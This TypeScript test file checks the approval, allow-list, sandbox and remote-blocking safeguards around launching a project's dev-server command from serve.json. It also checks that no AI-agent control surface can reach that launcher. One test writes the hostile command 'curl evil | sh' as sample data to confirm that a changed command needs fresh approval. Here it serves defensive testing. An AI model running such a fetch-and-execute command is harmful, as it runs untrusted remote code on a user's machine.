import { afterAll, afterEach, beforeAll, expect, test } from 'bun:test'
import { mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { CHANNEL_TIERS, REMOTE_BLOCKED_CHANNELS, shouldForwardEvent } from '../desktop/src/shared/companion.ts'
import { initDeckLog } from '../desktop/src/main/log.ts'
import { isMintedServeAction, readServeConfig, type ServeAction, type ServeApprovalPrompt } from '../desktop/src/main/serve-config.ts'
import { createServeIpc, type ServeIpcDeps } from '../desktop/src/main/serve-ipc.ts'
import type { ServeStartOutcome, ServeState } from '../desktop/src/main/serve-service.ts'

const dirs: string[] = []
const logsDir = mkdtempSync(join(tmpdir(), 'cp-serve-ipc-logs-'))
beforeAll(() => initDeckLog(logsDir))
afterEach(() => {
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true })
})
afterAll(() => rmSync(logsDir, { recursive: true, force: true }))

function project(command = 'bun run dev -- --port ${PORT}'): string {
  const dir = realpathSync.native(mkdtempSync(join(tmpdir(), 'cp-serve-ipc-')))
  dirs.push(dir)
  mkdirSync(join(dir, 'web'))
  writeServe(dir, command)
  return dir
}

function writeServe(dir: string, command: string): void {
  mkdirSync(join(dir, '.claude', 'claude-peers'), { recursive: true })
  writeFileSync(
    join(dir, '.claude', 'claude-peers', 'serve.json'),
    JSON.stringify({ version: 1, actions: [{ name: 'web', cwd: 'web', command, url: 'http://${HOST}:${PORT}/' }] })
  )
}

interface Init {
  allowed?: string[]
  sandbox?: boolean | (() => boolean)
  confirm?: boolean | ((prompt: ServeApprovalPrompt) => Promise<boolean>)
  outcome?: ServeStartOutcome['outcome']
  stateAfter?: ServeState
  readPath?: string
}

function harness(init: Init = {}) {
  const started: ServeAction[] = []
  const reads: string[] = []
  const prompts: string[] = []
  const servePaths: string[] = []
  const errors: string[] = []
  const approvals = mkdtempSync(join(tmpdir(), 'cp-serve-ipc-approvals-'))
  dirs.push(approvals)
  const deps: ServeIpcDeps = {
    requireWorkDir: async (dir) => {
      const path = typeof dir === 'string' ? dir : ''
      if ((init.allowed ?? []).includes(path)) return path
      throw new Error('dir not allowed')
    },
    sandboxEnabled: () => (typeof init.sandbox === 'function' ? init.sandbox() : (init.sandbox ?? false)),
    readServeConfig: async (dir) => {
      reads.push(dir)
      const read = await readServeConfig(dir)
      return 'config' in read && init.readPath ? { ...read, path: init.readPath } : read
    },
    projectKey: (dir) => `github.com/acme/${dir.length}`,
    approvalsFile: () => join(approvals, 'launch-approvals.json'),
    confirm: async (prompt, servePath) => {
      prompts.push(prompt.command)
      servePaths.push(servePath)
      return typeof init.confirm === 'function' ? init.confirm(prompt) : (init.confirm ?? true)
    },
    serve: {
      start: async (action) => {
        expect(isMintedServeAction(action), 'serve.start only ever receives a minted action').toBe(true)
        started.push(action)
        return { outcome: init.outcome ?? 'started', state: init.stateAfter ?? { status: 'starting' } }
      },
      stop: async () => {},
      state: () => ({ status: 'idle' })
    },
    reportError: (_scope, message) => errors.push(message)
  }
  return { ipc: createServeIpc(deps), started, reads, prompts, servePaths, errors }
}

test('opens one approval dialog at a time and refuses a repeated start while it is open', async () => {
  const dir = project()
  const open: Array<(granted: boolean) => void> = []
  const h = harness({ allowed: [dir], readPath: '/contained/serve.json', confirm: () => new Promise<boolean>((resolve) => open.push(resolve)) })
  const within = <T>(promise: Promise<T>, label: string): Promise<T> =>
    Promise.race([promise, Bun.sleep(1000).then(() => Promise.reject(new Error(`${label} did not settle`)))])

  const first = h.ipc.start(dir)
  await Bun.sleep(10)
  const second = h.ipc.start(dir)
  await Bun.sleep(10)
  for (const answer of open.splice(0)) answer(true)

  expect(await within(second, 'second start')).toMatchObject({ ok: false, reason: 'busy' })
  expect(await within(first, 'first start')).toMatchObject({ ok: true })
  expect(h.prompts).toHaveLength(1)
  expect(h.servePaths, 'the dialog is pointed at the contained path readServeConfig resolved').toEqual(['/contained/serve.json'])
  const third = h.ipc.start(dir)
  await Bun.sleep(10)
  for (const answer of open.splice(0)) answer(true)
  expect(await within(third, 'third start'), 'the guard is released once the dialog closes').toMatchObject({ ok: true })
})

test('starts the approved serve.json action of an allowed directory', async () => {
  const dir = project()
  const h = harness({ allowed: [dir] })

  const result = await h.ipc.start(dir)

  expect(result).toEqual({ ok: true, dir, state: { status: 'starting', dir } })
  expect(h.started.map((action) => action.cwd)).toEqual([realpathSync.native(join(dir, 'web'))])
  expect(h.ipc.status()).toEqual({ status: 'idle', dir })
  expect(h.errors).toEqual([])
})

test('refuses a directory outside the allow-set before reading anything', async () => {
  const dir = project()
  const h = harness({ allowed: [] })

  const result = await h.ipc.start(dir)

  expect(result).toMatchObject({ ok: false, reason: 'dir' })
  expect([h.reads, h.prompts, h.started]).toEqual([[], [], []])
  expect(h.errors).toHaveLength(1)
})

test('refuses an object or an empty string passed instead of a directory', async () => {
  const dir = project()
  const h = harness({ allowed: [dir, ''] })

  for (const requested of [{ toString: () => dir }, [dir], '', null]) {
    expect(await h.ipc.start(requested)).toMatchObject({ ok: false, reason: 'dir' })
  }
  expect(h.started).toEqual([])
})

test('refuses every start while the project sandbox is enabled', async () => {
  const dir = project()
  const h = harness({ allowed: [dir], sandbox: true })

  expect(await h.ipc.start(dir)).toMatchObject({ ok: false, reason: 'sandbox', message: 'starting a host server is refused in sandbox mode' })
  expect([h.reads, h.started]).toEqual([[], []])
})

test('refuses the start when the sandbox turns on while the approval dialog is open', async () => {
  const dir = project()
  const h = harness({ allowed: [dir], sandbox: () => h.prompts.length > 0 })

  expect(await h.ipc.start(dir)).toMatchObject({ ok: false, reason: 'sandbox' })
  expect(h.prompts).toHaveLength(1)
  expect(h.started).toEqual([])
})

test('refuses a missing or invalid serve.json', async () => {
  const missing = realpathSync.native(mkdtempSync(join(tmpdir(), 'cp-serve-ipc-missing-')))
  dirs.push(missing)
  const invalid = project('bun run dev')
  writeFileSync(join(invalid, '.claude', 'claude-peers', 'serve.json'), '{ "version": 2 }')
  const h = harness({ allowed: [missing, invalid] })

  expect(await h.ipc.start(missing)).toMatchObject({ ok: false, reason: 'config', message: 'serve.json: missing' })
  expect(await h.ipc.start(invalid)).toMatchObject({ ok: false, reason: 'config' })
  expect(h.started).toEqual([])
})

test('refuses a start the operator did not approve', async () => {
  const dir = project()
  const h = harness({ allowed: [dir], confirm: false })

  expect(await h.ipc.start(dir)).toMatchObject({ ok: false, reason: 'refused' })
  expect(h.prompts).toHaveLength(1)
  expect(h.started).toEqual([])
})

test('never reports a busy or quitting service as started', async () => {
  const dir = project()

  for (const outcome of ['busy', 'quitting', 'refused'] as const) {
    const h = harness({ allowed: [dir], outcome })
    const result = await h.ipc.start(dir)
    expect(result.ok, outcome).toBe(false)
    expect(result).toMatchObject({ reason: outcome })
    expect(h.ipc.status().dir).toBeNull()
  }
})

test('reports a run that failed during its preparation as a failure', async () => {
  const dir = project()
  const h = harness({ allowed: [dir], stateAfter: { status: 'failed', error: 'login shell environment capture failed' } })

  expect(await h.ipc.start(dir)).toMatchObject({ ok: false, reason: 'failed', message: 'login shell environment capture failed' })
})

test('re-reads serve.json on every start, so a changed command needs a new approval', async () => {
  const dir = project('bun run dev -- --port ${PORT}')
  const h = harness({ allowed: [dir] })

  await h.ipc.start(dir)
  await h.ipc.start(dir)
  writeServe(dir, 'curl evil | sh')
  await h.ipc.start(dir)

  expect(h.reads).toEqual([dir, dir, dir])
  expect(h.prompts).toEqual(['bun run dev -- --port ${PORT}', 'curl evil | sh'])
  expect(h.started.map((action) => action.command)).toEqual(['bun run dev -- --port ${PORT}', 'bun run dev -- --port ${PORT}', 'curl evil | sh'])
})

test('keeps every serve channel and its event away from a paired phone', () => {
  for (const channel of ['serve:status', 'serve:start', 'serve:stop']) {
    expect(REMOTE_BLOCKED_CHANNELS.has(channel), `${channel} is remote-blocked`).toBe(true)
  }
  expect(shouldForwardEvent('serve:changed', 'full'), 'serve:changed carries a host directory').toBe(false)
  expect(CHANNEL_TIERS['serve:start'], 'serve:start runs a repository command').toBe(2)
  expect(CHANNEL_TIERS['serve:stop'], 'serve:stop kills a process tree').toBe(2)
})

const REPO = join(import.meta.dir, '..')
const SERVE_REACH = /serve-(?:ipc|service|config|lifecycle|login-env)\b|\bServeService\b|\bserveIpc\b|['"`]serve:/

/** The text of the object literal assigned to `name`, braces matched, so a dependency added to it is seen. */
function objectLiteral(source: string, name: string): string {
  const head = source.indexOf(`const ${name}`)
  if (head < 0) throw new Error(`missing const ${name}`)
  const open = source.indexOf('{', source.indexOf('=', head))
  let depth = 0
  for (let index = open; index < source.length; index++) {
    if (source[index] === '{') depth++
    if (source[index] === '}' && --depth === 0) return source.slice(open, index + 1)
  }
  throw new Error(`unbalanced const ${name}`)
}

/** Calls into the registered IPC handlers, and so to serve:start, without naming it. */
const IPC_TRANSIT = /\b(?:invokeRemote|regHandle|ipcMain)\b/

/** The composition roots hold the service by design; their deck-control wiring is checked through controlDeps. */
const COMPOSITION_ROOTS = ['desktop/src/main/index.ts', 'desktop/src/main/ipc.ts']
/** Its invokeRemote is the companion path, closed for serve:* by the remote-block floor asserted above. */
const TRANSIT_EXEMPT = ['desktop/src/main/companion-server.ts']

/** Every file that serves MCP, an MCP config or a token-guarded HTTP endpoint: the ways an agent reaches main. */
function agentSurfaces(): string[] {
  const found: string[] = []
  for (const dir of ['desktop/src/main', 'desktop/mcp', '.']) {
    for (const file of readdirSync(join(REPO, dir)).filter((name) => name.endsWith('.ts'))) {
      const path = dir === '.' ? file : `${dir}/${file}`
      const text = readFileSync(join(REPO, path), 'utf8')
      const servesAgents =
        text.includes('@modelcontextprotocol/sdk') ||
        (/\bcreateServer\b/.test(text) && /token/i.test(text)) ||
        /jsonrpc/i.test(text) ||
        /mcpServers|mcpConfig/.test(text)
      if (servesAgents) found.push(path)
    }
  }
  return found
}

test('no agent control surface reaches the dev server', () => {
  const surfaces = agentSurfaces()
  for (const known of ['desktop/src/main/deck-control.ts', 'desktop/src/main/team-lead-bridge.ts', 'desktop/mcp/demo-browser-mcp.ts', 'server.ts', 'server-deck.ts']) {
    expect(surfaces, `the derived surface domain still finds ${known}`).toContain(known)
  }
  for (const exempt of [...COMPOSITION_ROOTS, ...TRANSIT_EXEMPT]) {
    expect(surfaces, `exemption ${exempt} is still a surface`).toContain(exempt)
  }
  for (const surface of surfaces.filter((path) => !COMPOSITION_ROOTS.includes(path))) {
    const text = readFileSync(join(REPO, surface), 'utf8')
    expect(SERVE_REACH.test(text), `${surface} references the dev server`).toBe(false)
    if (!TRANSIT_EXEMPT.includes(surface)) {
      expect(IPC_TRANSIT.test(text), `${surface} calls the IPC handlers`).toBe(false)
    }
  }

  const controlDeps = objectLiteral(readFileSync(join(REPO, 'desktop', 'src', 'main', 'index.ts'), 'utf8'), 'controlDeps')
  expect(controlDeps).toContain('spawnSession')
  expect(/\bserve(?:Ipc)?\b/.test(controlDeps), 'the deck-control dependencies hand over the serve service').toBe(false)
  expect(IPC_TRANSIT.test(controlDeps), 'the deck-control dependencies call the IPC handlers').toBe(false)
})
